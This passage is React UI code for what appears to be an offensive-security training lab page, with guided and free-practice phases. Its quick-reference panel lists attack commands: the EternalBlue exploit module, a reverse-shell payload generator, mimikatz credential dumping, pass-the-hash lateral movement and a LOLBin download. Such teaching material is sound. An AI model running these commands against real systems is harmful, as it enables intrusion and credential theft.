      <div style={{ background: 'rgba(191,95,255,0.04)', border: '1px solid rgba(191,95,255,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a1a5a', border: p.active ? '2px solid ' + accent : '1px solid #3a1a5a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a3a7a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a1a5a', margin: '0 2px' }}>&#8212;</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a6aaa' }}>
          MOD-{moduleNum} &nbsp;&#183;&nbsp; {moduleName.toUpperCase()} &nbsp;&#183;&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE &#8212; LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a3a7a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 &#8212; GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Offensive Security Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a6aaa', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          Reconnaissance, exploitation, post-exploitation, lateral movement, evasion, pivoting, and professional reporting.
          Complete all {steps.length} steps to unlock Phase 2.
        </p>

        {/* Section index */}
        <div style={{ background: 'rgba(191,95,255,0.03)', border: '1px solid rgba(191,95,255,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#3a1a5a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '6px' }}>
            {sections.map((s) => (
              <div key={s.num} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 8px', background: 'rgba(191,95,255,0.04)', borderRadius: '4px', border: '1px solid rgba(191,95,255,0.08)' }}>
                <span style={{ fontSize: '7px', color: s.color, fontWeight: 700, minWidth: '32px' }}>{s.num}</span>
                <span style={{ fontSize: '7.5px', color: '#8a6aaa' }}>{s.title}</span>
              </div>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="offensive-lab"
          moduleId={moduleId}
          title="Offensive Security Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(191,95,255,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.4)' : '#3a1a5a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a3a7a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a6aaa' : '#5a3a7a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 &#8212; FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a3a7a' }}>Full Offensive Security Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, background: 'rgba(191,95,255,0.08)', border: '1px solid rgba(191,95,255,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(191,95,255,0.04)' : '#080608', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.25)' : '#1a0a2a'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#7a5a9a' : '#3a1a5a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a3a7a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#8a6aaa', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Offensive Security
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['Nmap scanning', 'Metasploit', 'Payload generation', 'Privilege escalation', 'Lateral movement', 'Pivoting'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a1a5a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a6aaa' : '#3a1a5a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.6)' : '#3a1a5a'), borderRadius: '6px', background: guidedDone ? 'rgba(191,95,255,0.12)' : 'transparent', color: guidedDone ? accent : '#3a1a5a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(191,95,255,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a1a5a' }}>Complete all {steps.length} guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080608' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0810', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a4a8a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any offensive security technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a1a5a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a4a8a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '&#9660;' : '&#9658;'} QUICK REFERENCE &#8212; OFFENSIVE COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080608', border: '1px solid #1a0a2a', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['nmap -sC -sV -p- -oA scan target', 'Full service scan, all ports, save output'],
                ['gobuster dir -u http://target -w common.txt', 'Directory enumeration'],
                ['sqlmap -u "http://target?id=1" --dbs', 'Automated SQL injection'],
                ['msfconsole -q', 'Start Metasploit quietly'],
                ['use exploit/windows/smb/ms17_010_eternalblue', 'EternalBlue SMB exploit'],
                ['msfvenom -p windows/x64/meterpreter_reverse_tcp', 'Generate stageless payload'],
                ['find / -perm /4000 -type f 2>/dev/null', 'Find SUID binaries'],
                ['linpeas.sh', 'Linux privilege escalation enum'],
                ['mimikatz sekurlsa::logonpasswords', 'Dump Windows credentials'],
                ['impacket-psexec admin@target -hashes :HASH', 'Pass-the-hash lateral movement'],
                ['certutil -urlcache -split -f URL dest', 'Download via LOLBin'],
                ['proxychains nmap -sT -p 80 10.10.10.0/24', 'Scan through pivot'],
                ['evil-winrm -i target -u admin -H HASH', 'WinRM with hash'],
                ['route add 10.10.10.0/24 SESSION_ID', 'Metasploit pivot route'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060408', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.68rem', flexShrink: 0, whiteSpace: 'pre' }}>{cmd}</code>
                  <span style={{ color: '#8a6aaa', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #1a0a2a', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a4a8a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a4a8a' }}>MOD-05 ACTIVE DIRECTORY LAB &#8594;</Link>
      </div>
    </div>
  )
}
